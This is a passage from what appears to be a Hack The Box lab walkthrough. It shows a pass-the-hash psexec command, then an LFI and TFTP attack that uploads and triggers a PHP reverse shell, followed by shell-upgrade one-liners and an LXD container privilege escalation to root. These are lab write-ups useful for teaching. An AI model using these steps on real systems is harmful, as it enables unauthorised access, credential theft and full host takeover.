<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  ----------------------------------------------------------------------------------------------------------------------------------
  **psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18**
  ----------------------------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image153.png"
        data-srcset="/startingpoint/media/image153.png, media/image153.png 1.5x, /startingpoint/media/image153.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image153.png"
        title="/startingpoint/media/image153.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>An as we can see we gain elevated access to the system</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image154.png"
        data-srcset="/startingpoint/media/image154.png, media/image154.png 1.5x, /startingpoint/media/image154.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image154.png"
        title="/startingpoint/media/image154.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h2 id="9656-included-linux">▸ INCLUDED (Linux)</h2>
<ul>
<li>Machine : <b>Included (Linux)</b> </li>
<li>Ip: <b>10.10.10.55</b></li>
</ul>
<h3 id="9702-enumeration-3">◦ Enumeration</h3>
<p>=============</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------
  nmap -A -v 10.10.10.55
  ---------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image155.png"
        data-srcset="/startingpoint/media/image155.png, media/image155.png 1.5x, /startingpoint/media/image155.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image155.png"
        title="/startingpoint/media/image155.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------
  PORT STATE SERVICE VERSION
  
  **80/tcp** open http Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
  
  <span class="p">|</span> http-methods:
  
  <span class="p">|</span><span class="se">\_</span> Supported Methods: GET HEAD POST OPTIONS
  
  <span class="p">|</span><span class="se">\_</span>http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
  
  <span class="p">|</span> http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
  
  <span class="p">|</span><span class="se">\_</span>Requested resource was http://10.10.10.55/?file<span class="o">=</span>index.php
  
  <span class="p">|</span><span class="se">\_</span>https-redirect: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
  ---------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>From a TCP scan we found only port 80 (Apache httpd 2.4.29 ((Ubuntu)))</p>
<p>We can navigate to the website in a browser.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image156.png"
        data-srcset="/startingpoint/media/image156.png, media/image156.png 1.5x, /startingpoint/media/image156.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image156.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s try scanning the UDP ports</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -------------------------
  nmap -sU -v 10.10.10.55
  -------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image157.png"
        data-srcset="/startingpoint/media/image157.png, media/image157.png 1.5x, /startingpoint/media/image157.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image157.png"
        title="/startingpoint/media/image157.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -------------------------------
  Not shown: <span class="m">999</span> closed ports
  
  PORT STATE SERVICE
  
  **69/udp open<span class="p">|</span>filtered tftp**
  -------------------------------
</code></pre></td></tr></table>
</div>
</div><p>The UDP scan found <strong>port 69</strong> to be open, which hosts the <strong>TFTP</strong>
service.</p>
<p>TFTP or &ldquo;Trivial File Transfer Protocol&rdquo;, is similar to FTP but much
simpler. It provides functionality only for uploading or downloading
files from a server.</p>
<p>Let&rsquo;s see if we can connect to TFTP and upload a file.</p>
<p>We first create a file named “<strong>test.txt”</strong></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image158.png"
        data-srcset="/startingpoint/media/image158.png, media/image158.png 1.5x, /startingpoint/media/image158.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image158.png"
        title="/startingpoint/media/image158.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We connect and confirm that we can upload files.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image159.png"
        data-srcset="/startingpoint/media/image159.png, media/image159.png 1.5x, /startingpoint/media/image159.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image159.png"
        title="/startingpoint/media/image159.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702-lfilocal-file-inclusion">◦ LFI(Local File Inclusion)</h3>
<p>===========================</p>
<p>Let’s check if the URL of the website
“<strong>http://10.10.10.55/?file=index.php</strong>&quot; is vulnerable to <strong><em>Local File
Inclusion</em>.</strong></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image160.png"
        data-srcset="/startingpoint/media/image160.png, media/image160.png 1.5x, /startingpoint/media/image160.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image160.png"
        title="/startingpoint/media/image160.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can test by changing the URL to the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  -----------------------------------------------------
  **http://10.10.10.55/?file=../../../../etc/passwd**
  -----------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>This is successful, and <strong>passwd</strong> contents are returned by the server.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image161.png"
        data-srcset="/startingpoint/media/image161.png, media/image161.png 1.5x, /startingpoint/media/image161.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image161.png"
        title="/startingpoint/media/image161.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702-foothold-4">◦ Foothold</h3>
<p>=============</p>
<p>We can try upload and execute a “PHP reverse shell” by combining the LFI
vulnerability with the TFTP service. This happens due to the inclusion
of the PHP code by the vulnerable page, which results in it&rsquo;s execution.</p>
<p>First we have to modify the PHP reverse shell which cane be taken from
<em>here</em> if not present on our kali system.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image162.png"
        data-srcset="/startingpoint/media/image162.png, media/image162.png 1.5x, /startingpoint/media/image162.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image162.png"
        title="/startingpoint/media/image162.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s copy the file into our folder with name “<strong>rev.php</strong>”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image163.png"
        data-srcset="/startingpoint/media/image163.png, media/image163.png 1.5x, /startingpoint/media/image163.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image163.png"
        title="/startingpoint/media/image163.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>As usual, let’s modify the code for our needs:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image164.png"
        data-srcset="/startingpoint/media/image164.png, media/image164.png 1.5x, /startingpoint/media/image164.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image164.png"
        title="/startingpoint/media/image164.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Once changed the IP address and the port, we upload our PHP reverse
shell.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image165.png"
        data-srcset="/startingpoint/media/image165.png, media/image165.png 1.5x, /startingpoint/media/image165.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image165.png"
        title="/startingpoint/media/image165.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let&rsquo;s start a netcat listener before navigating to the shell.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image166.png"
        data-srcset="/startingpoint/media/image166.png, media/image166.png 1.5x, /startingpoint/media/image166.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image166.png"
        title="/startingpoint/media/image166.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Next, we can use the LFI to access the reverse shell.</p>
<ul>
<li>The <em>default TFTP root folde</em>r is <strong>/var/lib/tftpboot.</strong></li>
</ul>
<p>Navigating to
<em>http://10.10.10.55/?file=../../../../var/lib/tftpboot/rev.php</em>, due to
the inclusion of the PHP code by the vulnerable page, will results in
the PHP reverse shell execution.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image167.png"
        data-srcset="/startingpoint/media/image167.png, media/image167.png 1.5x, /startingpoint/media/image167.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image167.png"
        title="/startingpoint/media/image167.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image168.png"
        data-srcset="/startingpoint/media/image168.png, media/image168.png 1.5x, /startingpoint/media/image168.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image168.png"
        title="/startingpoint/media/image168.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><em><strong>We could have also used the “curl” tool as follow:</strong></em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ------------------------------------------------------------------------
  **curl http://10.10.10.55/?file<span class="o">=</span>../../../../var/lib/tftpboot/rev.php**
  ------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image169.png"
        data-srcset="/startingpoint/media/image169.png, media/image169.png 1.5x, /startingpoint/media/image169.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image169.png"
        title="/startingpoint/media/image169.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>And we get the reverse shell:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image168.png"
        data-srcset="/startingpoint/media/image168.png, media/image168.png 1.5x, /startingpoint/media/image168.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image168.png"
        title="/startingpoint/media/image168.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>The low privilged www-data user isn&rsquo;t allowed to read user files, let’s
update the shell as www-data</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------------------------
  **SHELL<span class="o">=</span>/bin/bash script -q /dev/null<span class="se">\
</span><span class="se"></span>  Ctrl-Z<span class="se">\
</span><span class="se"></span>  stty raw -echo<span class="se">\
</span><span class="se"></span>  fg<span class="se">\
</span><span class="se"></span>  reset<span class="se">\
</span><span class="se"></span>  xterm**
  ---------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image170.png"
        data-srcset="/startingpoint/media/image170.png, media/image170.png 1.5x, /startingpoint/media/image170.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image170.png"
        title="/startingpoint/media/image170.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Below some other ways to spwan a TTY shell. The top 3 would be most
successful in general for spawning from the command line.</p>
<ul>
<li>
<p><strong>python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/sh&quot;)'</strong></p>
</li>
<li>
<p><strong>echo os.system('/bin/bash&rsquo;)</strong></p>
</li>
<li>
<p><strong>/bin/sh -i</strong></p>
</li>
<li>
<p><strong>perl —e &lsquo;exec &ldquo;/bin/sh&rdquo;;'</strong></p>
</li>
<li>
<p><strong>perl: exec &ldquo;/bin/sh&rdquo;;</strong></p>
</li>
<li>
<p><strong>ruby: exec &ldquo;/bin/sh&rdquo;</strong></p>
</li>
<li>
<p><strong>lua: os.execute('/bin/sh&rsquo;)</strong></p>
</li>
<li>
<p>(From within IRB) <strong>exec &ldquo;/bin/sh&rdquo;</strong></p>
</li>
<li>
<p>(From within vi) <strong>:!bash</strong></p>
</li>
<li>
<p>(From within vi) <strong>:set shell=/bin/bash:shell</strong></p>
</li>
<li>
<p>(From within nmap) <strong>!sh</strong></p>
</li>
</ul>
<p>Many of these will also allow you to escape <em>jail shells</em></p>
<p>From the etc/passwd file we see that we can see there is a user “mike”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image171.png"
        data-srcset="/startingpoint/media/image171.png, media/image171.png 1.5x, /startingpoint/media/image171.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image171.png"
        title="/startingpoint/media/image171.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can “su” to the user mike with the password founded on the previous
machine (Pathfinder).</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image148.png"
        data-srcset="/startingpoint/media/image148.png, media/image148.png 1.5x, /startingpoint/media/image148.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image148.png"
        title="/startingpoint/media/image148.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>As shown below, once updated the shell as www-data, we can logged in as
mike.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image172.png"
        data-srcset="/startingpoint/media/image172.png, media/image172.png 1.5x, /startingpoint/media/image172.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image172.png"
        title="/startingpoint/media/image172.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>At location /home/mike we can find the user.txt file</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image173.png"
        data-srcset="/startingpoint/media/image173.png, media/image173.png 1.5x, /startingpoint/media/image173.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image173.png"
        title="/startingpoint/media/image173.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We also notice that mike is a <strong>lxd</strong> member</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image174.png"
        data-srcset="/startingpoint/media/image174.png, media/image174.png 1.5x, /startingpoint/media/image174.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image174.png"
        title="/startingpoint/media/image174.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>The LXD group is a high-privileged linux group; a member of the local
“lxd” group can instantly escalate the privileges to root on the host
operating system.</p>
<h3 id="x25b9-lxd">▹ LXD</h3>
<h4 id="9702-introduction-to-lxd-and-lxc">◦ <em><strong>Introduction to LXD and LXC</strong></em></h4>
<p>This is irrespective of whether that user has been granted sudo rights
and does not require them to enter their password. <em>The vulnerability
exists even with the LXD snap package</em></p>
<p>LXD is a root process that carries out actions for anyone with write
access to the LXD UNIX socket. It often does not attempt to match the
privileges of the calling user. There are multiple methods to exploit
this.</p>
<p>One of them is to use the LXD API to mount the host’s root filesystem
into a container which is going to use in this post. This gives a
low-privilege user root access to the host filesystem. </p>
<h4 id="9702-linux-container-lxc">◦ <em><strong>Linux Container (LXC)</strong></em></h4>
<p>*** Are often considered as a lightweight***
Virtualization technology that is something in the middle between a
chroot and a completely developed virtual machine, which creates an
environment as close as possible to a Linux installation but without the
need for a separate kernel.</p>
<h4 id="9702-linux-daemon-lxd">◦ <em><strong>Linux daemon (LXD)</strong></em></h4>
<p><em><strong>is the lightervisor, or lightweight container</strong></em>
Hypervisor. LXD is building on top of a container technology called LXC
which was used by Docker before. It uses the stable LXC API to do all
the container management behind the scene, adding the REST API on top
and providing a much simpler, more consistent user experience.</p>
<h4 id="9702-container-technology">◦ <em><strong>Container Technology</strong></em></h4>
<p>Container technology comes from the container, is a procedure to
assemble an application so that it can be run, with its requirements, in
isolation from other processes container applications with names like
Docker and Apache Mesos ‘ popular choices have been introduced by major
public cloud vendors including Amazon Web Services, Microsoft Azure and
Google Cloud Platforms.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image175.png"
        data-srcset="/startingpoint/media/image175.png, media/image175.png 1.5x, /startingpoint/media/image175.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image175.png"
        title="IMG_256"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702-lxd-privilege-escalation">◦ LXD Privilege Escalation</h3>
<p>==========================</p>
<p>Privilege escalation through lxd requires the access of local account.</p>
<p><strong>Note: the most important condition is that the user should be a member
of lxd group (<em><strong>in our case is 108, but it could have been any other
number</strong></em>)</strong></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image176.png"
        data-srcset="/startingpoint/media/image176.png, media/image176.png 1.5x, /startingpoint/media/image176.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image176.png"
        title="/startingpoint/media/image176.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>First, we have create an image for lxd, thus we first need to clone on
our local machine the following build-alpine repository</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------------------------
  git clone https://github.com/saghul/lxd-alpine-builder.git
  ---------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image177.png"
        data-srcset="/startingpoint/media/image177.png, media/image177.png 1.5x, /startingpoint/media/image177.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image177.png"
        title="/startingpoint/media/image177.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We move into the lxd-alpine-builder</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image178.png"
        data-srcset="/startingpoint/media/image178.png, media/image178.png 1.5x, /startingpoint/media/image178.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image178.png"
        title="/startingpoint/media/image178.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>And execute the “./build-alpine” file</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image179.png"
        data-srcset="/startingpoint/media/image179.png, media/image179.png 1.5x, /startingpoint/media/image179.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image179.png"
        title="/startingpoint/media/image179.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image179.png"
        data-srcset="/startingpoint/media/image179.png, media/image179.png 1.5x, /startingpoint/media/image179.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image179.png"
        title="/startingpoint/media/image179.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>On running the above command, a “<strong>tar.gz</strong>” file is created. Now we
have to transferred this “tar.gz” file from the attacker machine to the
host (victim) machine.</p>
<p>We can use the following python command to start a local webserver</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">---------------------------------------------------------------------------------------
python -m SimpleHTTPServer <span class="m">8888</span>
---------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image180.png"
        data-srcset="/startingpoint/media/image180.png, media/image180.png 1.5x, /startingpoint/media/image180.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image180.png"
        title="/startingpoint/media/image180.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>On the host(victim) machine we can download the file “<strong>tar.gz</strong>” using
the command “wget” as follow:</p>
<ul>
<li>
<p>First we move into the /tmp folder</p>
</li>
<li>
<p>Then we run the command</p>
</li>
</ul>
<p>wget 10.10.14.3:8888/alpine-v3.10-x86_64-20191008_1227.tar.gz</p>
<p>We will see that our file has been transferred/downloaded.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image181.png"
        data-srcset="/startingpoint/media/image181.png, media/image181.png 1.5x, /startingpoint/media/image181.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image181.png"
        title="/startingpoint/media/image181.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Next, we run the following commands to get the root.</p>
<p>First we built the image and can be added as an image to LXD as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------------------------
  lxc image import ./alpine-v3.12-x86<span class="se">\_</span>64-20200728<span class="se">\_</span>1438.tar.gz --alias &lt;aliasName&gt;
  
  lxc image import ./alpine-v3.12-x86<span class="se">\_</span>64-20200728<span class="se">\_</span>1438.tar.gz --alias rootimage
  ---------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>In the above command we used “rootimage” as ALIAS but it could ahve been
any name</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image182.png"
        data-srcset="/startingpoint/media/image182.png, media/image182.png 1.5x, /startingpoint/media/image182.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image182.png"
        title="/startingpoint/media/image182.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can use the list command to check the list of images</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------------------------
  **lxc image list**
  ---------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image183.png"
        data-srcset="/startingpoint/media/image183.png, media/image183.png 1.5x, /startingpoint/media/image183.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image183.png"
        title="/startingpoint/media/image183.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>The command above will let us have access to the entire filesystem from
within the container.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------------------------
  *lxc init &lt;aliasName&gt; ignite -c security.privileged<span class="o">=</span>true*
  
  **lxc init rootimage ignite -c security.privileged<span class="o">=</span>true**
  
  **lxc config device add ignite mydevice disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span>true**
  ---------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>The next set of commands start the container and drop us into a shell
(as root) on it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------------------------
  **lxc start ignite**
  
  **lxc <span class="nb">exec</span> ignite /bin/sh**
  ---------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>We can now navigate to /mnt/root/root/ and read root.txt along with
login.sql, which reveals credentials.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image184.png"
        data-srcset="/startingpoint/media/image184.png, media/image184.png 1.5x, /startingpoint/media/image184.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image184.png"
        title="/startingpoint/media/image184.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>The <strong>login.sql</strong> file reveals some credentials</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image185.png"
        data-srcset="/startingpoint/media/image185.png, media/image185.png 1.5x, /startingpoint/media/image185.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image185.png"
        title="/startingpoint/media/image185.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image185.png"
        data-srcset="/startingpoint/media/image185.png, media/image185.png 1.5x, /startingpoint/media/image185.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image185.png"
        title="/startingpoint/media/image185.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 20 Feb 2022&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/e6132990af33bb0085334a318ad880565ad9b5e5" target="_blank" title="commit by psqnix(psqnix@gmail.com) e6132990af33bb0085334a318ad880565ad9b5e5: new commit">
                                    <i class="fas fa-hashtag fa-fw"></i>e613299</a></span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/startingpoint/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
